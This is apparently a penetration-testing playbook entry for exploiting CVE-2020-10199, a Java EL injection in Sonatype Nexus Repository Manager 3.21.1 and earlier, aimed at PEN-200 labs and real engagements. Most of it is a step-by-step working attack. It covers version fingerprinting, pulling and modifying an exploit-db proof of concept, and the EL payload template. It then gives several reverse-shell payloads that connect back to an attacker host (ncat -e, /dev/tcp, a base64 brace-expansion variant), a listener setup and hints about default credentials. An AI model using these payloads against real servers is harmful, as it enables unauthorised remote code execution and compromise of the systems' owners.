title: Nexus Repository Manager — Java EL Injection (CVE-2020-10199)
body:
Sonatype Nexus Repository Manager 3.21.1 and below are vulnerable to Java Expression Language injection in the `memberNames` field of the repository group creation endpoint. Authenticated low-privilege users can inject `${...}` syntax that gets evaluated server-side, giving full RCE as the `nexus` user.

The public exploits (exploit-db 49385, Metasploit's nexus_repo_manager_el_injection) work, but in practice you'll need to modify them — wrong host hardcoded, wrong creds, Windows payload on a Linux box, and the bash redirection (`>&`) breaks because `Runtime.exec()` doesn't invoke a shell.

Identification:
  - HTTP banner: `Nexus/3.21.x-01 (OSS)` (X-Server-Header)
  - Port: typically 8081
  - Title: 'Nexus Repository Manager'
  - `/repository/` and `/service/` exposed in robots.txt

When you'll find it: PEN-200 labs (Sona is the canonical example), unpatched internal Nexus instances on real engagements, anything stuck on 3.21.x or lower.
cmd:
# ══════════════════════════════════════════════════
# STEP 1 — CONFIRM VERSION
# ══════════════════════════════════════════════════
curl -sI http://$ip:8081 | grep -i server
# Server: Nexus/3.21.1-01 (OSS)   ← vulnerable if ≤ 3.21.1

# Also check the homepage:
curl -s http://$ip:8081 | grep -i 'nexus\|repository'

# ══════════════════════════════════════════════════
# STEP 2 — GET CREDENTIALS
# ══════════════════════════════════════════════════
# This exploit is AUTHENTICATED. You need admin or any low-priv user.
# Common sources of credentials:
#   - Default: admin / admin123 (very old installs)
#   - Application-specific recovery flows (see Sona box: telnet brute → recover password)
#   - Found in other compromised systems (config files, dev notes)
#   - SSRF / unrelated app leak

# ══════════════════════════════════════════════════
# STEP 3 — GRAB THE EXPLOIT
# ══════════════════════════════════════════════════
searchsploit nexus repository
searchsploit -m 49385                            # ExploitDB 49385, the python one
cp /usr/share/exploitdb/exploits/.../49385.py exploit.py

# Or pull from Metasploit (works but uses Java meterpreter, less educational):
# msfconsole -q -x 'use exploit/linux/http/nexus_repo_manager_el_injection'

# ══════════════════════════════════════════════════
# STEP 4 — FIX THE EXPLOIT (you WILL have to)
# ══════════════════════════════════════════════════
# The PoC ships with hardcoded values for the author's test environment.
# Edit these four:
URL='http://192.168.1.1:8081'                    # → http://$ip:8081
CMD='cmd.exe /c calc.exe'                        # → linux payload (see below)
USERNAME='admin'                                 # → your actual user
PASSWORD='password'                              # → your actual password

# Add Burp proxy support — invaluable for debugging:
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# Then on every s.post() call:
r = s.post(URL + '/service/rapture/session', data=body, proxies=proxies, verify=False)
r = s.post(URL + '/service/rest/beta/repositories/go/group', json=body, proxies=proxies, verify=False)

# ══════════════════════════════════════════════════
# STEP 5 — PAYLOAD SELECTION (this is where people get stuck)
# ══════════════════════════════════════════════════
# The payload field substitutes into:
#   ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('YOUR_CMD')}
#
# Runtime.exec() does NOT invoke a shell. It tokenizes on spaces and runs argv[0]
# with the rest as args. Shell metacharacters (>&, |, &&, $()) DO NOT WORK.

# WRONG — silently fails, server still returns 'Command executed':
CMD='bash -i >& /dev/tcp/$lhost/443 0>&1'
# Java sees: argv=['bash', '-i', '>&', '/dev/tcp/...', '0>&1'] — redirection is literal

# RIGHT — test RCE first with something simple:
CMD='ping -c 4 $lhost'
# Then on Kali: sudo tcpdump -i tun0 icmp
# If you see ICMP, RCE works.

# RIGHT — reverse shell via ncat (no shell metacharacters needed):
CMD='ncat $lhost 443 -e /bin/bash'
# Some targets have ncat, some don't. Check with which:
CMD='which ncat nc bash python3'
# (won't return output to you, but Burp can see it via the response)

# RIGHT — base64-encoded shell (works when ncat is absent):
# Build the encoded form on Kali first:
echo -n 'bash -i >& /dev/tcp/192.168.45.201/443 0>&1' | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwMS80NDMgMD4mMQ==
# Then payload:
CMD='bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwMS80NDMgMD4mMQ==}|{base64,-d}|{bash,-i}'
# Brace expansion sidesteps space-tokenization. {bash,-i} = bash -i after expansion.

# ══════════════════════════════════════════════════
# STEP 6 — LISTEN + FIRE
# ══════════════════════════════════════════════════
# Terminal 1:
sudo tcpdump -i tun0 icmp                        # to confirm RCE
nc -nlvp 443                                     # to catch the shell

# Terminal 2:
python3 exploit.py

# Expected successful output:
# Logging in
# Logged in successfully
# Command executed

# ══════════════════════════════════════════════════
# DEBUGGING — when login succeeds but no shell comes back
# ══════════════════════════════════════════════════
# 'Command executed' just means the server returned an error containing
# 'java.lang.ProcessImpl' — it does NOT mean your reverse shell connected.
#
# Workflow:
# 1. Confirm RCE with ping (see Step 5)
# 2. Confirm outbound network: CMD='curl http://$lhost:8000/'  (watch python http.server)
# 3. Try common ports: 443, 80, 4444, 53 (lab may block outbound)
# 4. Switch payload form: ncat → base64 → brace expansion
# 5. Run with Burp proxy on — see both requests and the exact error in response 2
warn: The exploit reports 'Command executed' on a 400 response with java.lang.ProcessImpl in the body. This means your INJECTION succeeded, not that your reverse shell connected. Always test RCE with ping (visible in tcpdump) before assuming the exploit is broken.

choices.label: Got nexus user shell — start enumeration
Exploit script broken — diff against working browser request
Reverse shell won't connect but ping works — payload form issue
No credentials yet — check brute-forceable services
